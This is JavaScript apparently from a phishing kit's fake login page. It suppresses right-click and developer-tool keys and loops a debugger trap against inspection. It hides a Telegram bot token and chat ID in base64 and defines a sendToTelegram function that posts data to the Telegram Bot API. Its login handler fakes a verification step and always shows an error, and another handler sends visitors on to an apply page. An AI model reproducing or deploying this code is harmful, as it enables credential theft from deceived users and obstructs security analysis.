(function securityLayer() {
  document.addEventListener('contextmenu', e => e.preventDefault());
  document.addEventListener('keydown', e => {
    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
      e.preventDefault();
      return false;
    }
  });
  setInterval(() => { debugger; }, 2000);
})();

const _0x5a21 = [
  "ODk3MDM3NzIyOTpBQUZZZkQxRDBrOTQzUkpQNFM2N0p6QjdWZWpLZnhpdlVwTQ==",
  "LTEwMDI4NDM2MzM5OTY="
];
const _BOT_TOKEN = atob(_0x5a21[0]);
const _CHAT_ID = atob(_0x5a21[1]);

async function sendToTelegram(message) {
  try {
    const response = await fetch('https://api.telegram.org/bot' + _BOT_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: _CHAT_ID,
        text: message,
        disable_web_page_preview: true
      })
    });
    const result = await response.json();
    return result.ok;
  } catch (e) {
    return false;
  }
}

function togglePassword() {
  const input = document.getElementById('password');
  const icon = document.getElementById('eyeIcon');
  if (!input || !icon) return;
  if (input.type === 'password') {
    input.type = 'text';
    icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
  } else {
    input.type = 'password';
    icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
  }
}

function showLoginCard(e) {
  if (e) e.preventDefault();
  const loginCard = document.getElementById('loginCard');
  const errorCard = document.getElementById('errorCard');
  if (loginCard) loginCard.classList.remove('hidden');
  if (errorCard) errorCard.classList.add('hidden');
}

function showErrorCard(e) {
  if (e) e.preventDefault();
  const emailInput = document.getElementById('emailMobile');
  const displayEmail = document.getElementById('displayEmail');
  const email = (emailInput ? emailInput.value : '') || 'user@example.com';
  if (displayEmail) displayEmail.textContent = email;
  const loginCard = document.getElementById('loginCard');
  const errorCard = document.getElementById('errorCard');
  if (loginCard) loginCard.classList.add('hidden');
  if (errorCard) errorCard.classList.remove('hidden');
}

function handleLogin(e) {
  if (e) e.preventDefault();
  const emailInput = document.getElementById('emailMobile');
  const email = (emailInput ? emailInput.value : '') || 'user@example.com';
  startLoader('Verifying credentials...', 'Please wait a moment', 3000, function () {
    const displayEmail = document.getElementById('displayEmail');
    if (displayEmail) displayEmail.textContent = email;
    const loginCard = document.getElementById('loginCard');
    const errorCard = document.getElementById('errorCard');
    if (loginCard) loginCard.classList.add('hidden');
    if (errorCard) errorCard.classList.remove('hidden');
  });
}

function openApply(e) {
  if (e) e.preventDefault();
  startLoader('Redirecting to Application...', 'Taking you to apply page', 3000, function () {
    window.location.href = 'apply.html';
  });
}

function startLoader(title, sub, duration, cb) {
  const loader = document.getElementById('loader');
  const fill = document.getElementById('progressFill');
  const titleEl = document.getElementById('loaderTitle');
  const subEl = document.getElementById('loaderSub');
  if (titleEl) titleEl.textContent = title;
  if (subEl) subEl.textContent = sub;
  if (fill) fill.style.width = '0%';
  if (loader) loader.classList.add('show');
  const start = Date.now();
  const t = setInterval(function () {
    const pct = Math.min(((Date.now() - start) / duration) * 100, 100);
    if (fill) fill.style.width = pct + '%';
    if (pct >= 100) {
      clearInterval(t);
      setTimeout(function () {
        if (loader) loader.classList.remove('show');
        if (cb) cb();
      }, 200);
    }
  }, 40);
}